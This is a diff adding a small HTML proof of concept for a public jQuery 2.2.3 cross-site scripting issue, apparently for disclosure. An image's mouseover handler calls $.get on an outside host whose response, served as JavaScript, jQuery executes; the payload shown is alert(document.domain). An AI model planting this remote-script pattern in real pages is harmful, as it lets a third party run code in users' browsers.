@@ -1,0 +1,14 @@
+<script src="https://code.jquery.com/jquery-2.2.3.min.js" integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo=" crossorigin="anonymous"></script>
+
+<img 
+  src = http://i.imgur.com/7JkZNOz.jpg 
+  onmouseover = "$.get('http://sakurity.com/jqueryxss');"
+  width = 100
+>
+
+<!--
+http://sakurity.com/jqueryxss: 
+Content-Type:text/javascript
+alert(document.domain);
+https://github.com/jquery/jquery/issues/2432
+-->
